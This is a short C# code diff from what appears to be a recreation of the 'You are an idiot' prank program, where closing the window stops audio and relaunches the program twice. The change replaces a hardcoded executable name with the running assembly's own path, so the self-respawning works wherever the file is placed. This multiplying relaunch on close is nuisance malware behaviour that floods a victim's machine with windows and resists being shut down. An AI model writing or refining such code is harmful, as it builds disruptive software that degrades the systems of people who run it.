@@ -118,8 +118,8 @@ namespace youareanidiot
         private void Form1_FormClosed(object sender, FormClosedEventArgs e)
         {
             Program.stopaudio();
-            Process.Start("youareanidiot.exe");
-            Process.Start("youareanidiot.exe");
+            Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location);
+            Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location);
 
         }
 
